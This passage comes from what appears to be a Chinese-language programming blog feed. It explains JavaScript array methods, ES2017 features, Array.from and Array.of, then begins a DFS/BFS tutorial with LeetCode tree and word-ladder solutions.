punctuation">,</span>next<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> prev <span class="token operator">+</span> next<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//15</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="6、every-返回一个Boolean值，判断数组中每一个元素是否符合function的条件"><a href="#6、every-返回一个Boolean值，判断数组中每一个元素是否符合function的条件" class="headerlink" title="6、every 返回一个Boolean值，判断数组中每一个元素是否符合function的条件"></a>6、every 返回一个Boolean值，判断数组中每一个元素是否符合function的条件</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">every</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//true(所有元素都满足才为true)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="7、some-返回一个Boolean值，判断数组中是否有元素符合function的条件"><a href="#7、some-返回一个Boolean值，判断数组中是否有元素符合function的条件" class="headerlink" title="7、some 返回一个Boolean值，判断数组中是否有元素符合function的条件"></a>7、some 返回一个Boolean值，判断数组中是否有元素符合function的条件</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//true(只要有一个满足即可)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="ES2017"><a href="#ES2017" class="headerlink" title="ES2017"></a>ES2017</h2><ul><li>Object.values</li><li>Object.entries</li><li>Object.getOwnPropertyDescriptors</li><li>String.prototype.padStart</li><li>Sting.prototype.padEnd</li><li>函数参数中添加尾逗号</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    foo<span class="token punctuation">:</span> <span class="token string">'value1'</span><span class="token punctuation">,</span>    bar<span class="token punctuation">:</span> <span class="token string">'value2'</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 键</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 值</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// [["foo", "value1"], ["bar", "value2"]]</span><span class="token comment" spellcheck="true">// 可以用这种方法来遍历对象</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 对象转换为Map</span><span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 获取对象的完整描述信息</span><span class="token comment" spellcheck="true">// {foo: {…}, bar: {…}}</span><span class="token comment" spellcheck="true">// foo:</span><span class="token comment" spellcheck="true">// value: "value1"</span><span class="token comment" spellcheck="true">// writable: true</span><span class="token comment" spellcheck="true">// enumerable: true</span><span class="token comment" spellcheck="true">// configurable: true</span><span class="token comment" spellcheck="true">// bar:</span><span class="token comment" spellcheck="true">// value: "value2"</span><span class="token comment" spellcheck="true">// writable: true</span><span class="token comment" spellcheck="true">// enumerable: true</span><span class="token comment" spellcheck="true">// configurable: true</span><span class="token comment" spellcheck="true">//padEnd和padStart可以使输出更工整</span><span class="token keyword">const</span> books <span class="token operator">=</span> <span class="token punctuation">{</span>    html<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>    css<span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">,</span>    javascript<span class="token punctuation">:</span> <span class="token number">128</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> count<span class="token punctuation">]</span> <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>books<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token punctuation">.</span><span class="token function">padEnd</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">|</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>count<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// html------------|005</span><span class="token comment" spellcheck="true">// css-------------|016</span><span class="token comment" spellcheck="true">// javascript------|128</span><span class="token comment" spellcheck="true">// 尾逗号，方便代码管理</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">100</span><span class="token punctuation">,</span>    <span class="token number">200</span><span class="token punctuation">,</span>    <span class="token number">300</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><h2 id="Array-from"><a href="#Array-from" class="headerlink" title="Array.from"></a>Array.from</h2><p><strong>将一个类数组对象或者可遍历对象转换成一个真正的数组。</strong></p><ul><li>该类数组对象必须具有length属性，用于指定数组的长度。如果没有length属性，那么转换后的数组是一个空数组。</li><li>该类数组对象的属性名必须为数值型或字符串型的数字</li><li>该类数组对象的属性名可以加引号，也可以不加引号</li><li><code>Array.from</code>可以接受第二个参数，作用类似于数组的<code>map</code>方法，用来对每个元素进行处理，将处理后的值放入返回的数组。</li></ul><h3 id="从-String-生成数组"><a href="#从-String-生成数组" class="headerlink" title="从 String 生成数组"></a>从 <code>String</code> 生成数组</h3><pre class=" language-js"><code class="language-js">Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [ "f", "o", "o" ], 可以代替 split</span></code></pre><h3 id="从-Set-生成数组"><a href="#从-Set-生成数组" class="headerlink" title="从 Set 生成数组"></a>从 <code>Set</code> 生成数组</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token keyword">set</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">set</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [ "foo", "bar", "baz" ]</span></code></pre><h3 id="从-Map-生成数组"><a href="#从-Map-生成数组" class="headerlink" title="从 Map 生成数组"></a>从 <code>Map</code> 生成数组</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [[1, 2], [2, 4], [4, 8]]</span><span class="token keyword">const</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>mapper<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ['a', 'b'];</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>mapper<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ['1', '2'];</span></code></pre><h3 id="从类数组对象（arguments）生成数组"><a href="#从类数组对象（arguments）生成数组" class="headerlink" title="从类数组对象（arguments）生成数组"></a>从类数组对象（arguments）生成数组</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [ 1, 2, 3 ]</span></code></pre><h3 id="在-Array-from-中使用箭头函数"><a href="#在-Array-from-中使用箭头函数" class="headerlink" title="在 Array.from 中使用箭头函数"></a>在 <code>Array.from</code> 中使用箭头函数</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Using an arrow function as the map function to</span><span class="token comment" spellcheck="true">// manipulate the elements</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [2, 4, 6]</span><span class="token comment" spellcheck="true">// Generate a sequence of numbers</span><span class="token comment" spellcheck="true">// Since the array is initialized with `undefined` on each position,</span><span class="token comment" spellcheck="true">// the value of `v` below will be `undefined`</span>Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token punctuation">{</span>length<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// [0, 1, 2, 3, 4]</span></code></pre><h3 id="初始化二维数组"><a href="#初始化二维数组" class="headerlink" title="初始化二维数组"></a>初始化二维数组</h3><pre class=" language-js"><code class="language-js">Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="Array-of"><a href="#Array-of" class="headerlink" title="Array.of"></a>Array.of</h2><p><code>Array.of()</code> 方法创建一个具有可变数量参数的新数组实例，而不考虑参数的数量或类型。</p><pre class=" language-js"><code class="language-js">Array<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// [7]</span>Array<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [1, 2, 3]</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// [ , , , , , , ]</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// [1, 2, 3]</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DFS、BFS</title>
      <link href="2020/10/29/%E7%AE%97%E6%B3%95-DFS%E3%80%81BFS/"/>
      <url>2020/10/29/%E7%AE%97%E6%B3%95-DFS%E3%80%81BFS/</url>
      
        <content type="html"><![CDATA[<ul><li>深度优先遍历</li><li>广度优先遍历</li><li>求根到叶子节点数字之和（DFS）</li><li>单词接龙（BFS）</li><li>N叉树的最大深度（BFS）</li><li>打家劫舍三（DFS）</li></ul><h2 id="深度优先，广度优先（层次遍历）"><a href="#深度优先，广度优先（层次遍历）" class="headerlink" title="深度优先，广度优先（层次遍历）"></a>深度优先，广度优先（层次遍历）</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//深度优先的递归实现</span><span class="token keyword">function</span> <span class="token function">deepTraversal</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span>nodeList<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nodeList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> children <span class="token operator">=</span> node<span class="token punctuation">.</span>children<span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//每次递归的时候将  需要遍历的节点  和 节点所存储的数组传下去</span>                <span class="token function">deepTraversal</span><span class="token punctuation">(</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>nodeList<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">return</span> nodeList<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//深度优先非递归</span><span class="token keyword">function</span> <span class="token function">deepTraversal</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> nodeList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">var</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">var</span> childrenItem <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              nodeList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>childrenItem<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">var</span> childrenList <span class="token operator">=</span> childrenItem<span class="token punctuation">.</span>children<span class="token punctuation">;</span>              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> childrenList<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//从右向左进栈</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>childrenList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>        <span class="token keyword">return</span> nodeList<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//广度非递归</span><span class="token keyword">function</span> <span class="token function">wideTraversal</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> nodes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">var</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          queue<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//加入根节点</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">var</span> item <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//拿出队头元素</span>            nodes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//加入结果</span>            <span class="token keyword">var</span> children <span class="token operator">=</span> item<span class="token punctuation">.</span>children<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//队友元素的孩子加入队尾</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                  queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> nodes<span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><h2 id="求根到叶子节点数字之和"><a href="#求根到叶子节点数字之和" class="headerlink" title="求根到叶子节点数字之和"></a>求根到叶子节点数字之和</h2><ul><li><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers/" target="_blank" rel="noopener">leetcode129</a></li></ul><blockquote><p>给定一个二叉树，它的每个结点都存放一个 0-9 的数字，每条从根到叶子节点的路径都代表一个数字。<br>例如，从根到叶子节点路径 1-&gt;2-&gt;3 代表数字 123。<br>计算从根到叶子节点生成的所有数字之和。<br>说明: 叶子节点是指没有子节点的节点。</p><p>示例 1:<br>输入: [1,2,3]<br>    1<br>   / \<br>  2   3<br>输出: 25<br>解释:<br>从根到叶子节点路径 1-&gt;2 代表数字 12.<br>从根到叶子节点路径 1-&gt;3 代表数字 13.<br>因此，数字总和 = 12 + 13 = 25.</p><p>示例 2:<br>输入: [4,9,0,5,1]<br>    4<br>   / \<br>  9   0<br> / \<br>5   1<br>输出: 1026<br>解释:<br>从根到叶子节点路径 4-&gt;9-&gt;5 代表数字 495.<br>从根到叶子节点路径 4-&gt;9-&gt;1 代表数字 491.<br>从根到叶子节点路径 4-&gt;0 代表数字 40.<br>因此，数字总和 = 495 + 491 + 40 = 1026.</p></blockquote><ul><li>从根节点开始，遍历每个节点，如果遇到叶子节点，则将叶子节点对应的数字加到数字之和。如果当前节点不是叶子节点，则计算其子节点对应的数字，然后对子节点递归遍历。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> dfs <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 若节点是 null 直接返回 0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 不是空节点就计算一下加到目前的值</span>    <span class="token keyword">const</span> sum <span class="token operator">=</span> n <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> root<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 若是根节点返回该计算值，一条路就走完了</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 不是根节点则递归遍历</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> sum<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> sumNumbers <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="单词接龙"><a href="#单词接龙" class="headerlink" title="单词接龙"></a>单词接龙</h2><ul><li>题目来源：<a href="https://leetcode-cn.com/problems/word-ladder/" target="_blank" rel="noopener">leetcode127</a></li></ul><blockquote><p>给定两个单词（beginWord 和 endWord）和一个字典，找到从 beginWord 到 endWord 的最短转换序列的长度。转换需遵循如下规则：</p><p>每次转换只能改变一个字母。<br>转换过程中的中间单词必须是字典中的单词。<br>说明:</p><p>如果不存在这样的转换序列，返回 0。<br>所有单词具有相同的长度。<br>所有单词只由小写字母组成。<br>字典中不存在重复的单词。<br>你可以假设 beginWord 和 endWord 是非空的，且二者不相同。</p><p>示例 1:<br>输入:<br>beginWord = “hit”,<br>endWord = “cog”,<br>wordList = [“hot”,”dot”,”dog”,”lot”,”log”,”cog”]<br>输出: 5<br>解释: 一个最短转换序列是 “hit” -&gt; “hot” -&gt; “dot” -&gt; “dog” -&gt; “cog”,<br>     返回它的长度 5。</p><p>示例 2:<br>输入:<br>beginWord = “hit”<br>endWord = “cog”<br>wordList = [“hot”,”dot”,”dog”,”lot”,”log”]<br>输出: 0<br>解释: endWord “cog” 不在字典中，所以无法进行转换。</p></blockquote><ul><li>抽象为图，若两个单词可以转换，则连一条双向边，BFS求起点到终点最短路径</li><li>优化为：求图的最短路径，使用队列 + BFS 实现</li><li>参考题解：<a href="https://leetcode-cn.com/problems/word-ladder/solution/bfs-de-ying-yong-by-muyunyun/" target="_blank" rel="noopener">BFS的应用</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> ladderLength <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>beginWord<span class="token punctuation">,</span> endWord<span class="token punctuation">,</span> wordList<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>wordList<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>endWord<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">// 用一个对象维护当前节点是否访问过</span>    <span class="token keyword">let</span> visitedObj <span class="token operator">=</span> <span class="token punctuation">{</span>        beginWord<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 用 level 记录当前路径长度</span>    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> word<span class="token punctuation">:</span> beginWord<span class="token punctuation">,</span> level<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 队列实现 BFS</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> word<span class="token punctuation">,</span> level <span class="token punctuation">}</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>visitedObj<span class="token punctuation">[</span>word<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> wordList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 若只有一个字母不同则证明是相邻两边，入队列</span>            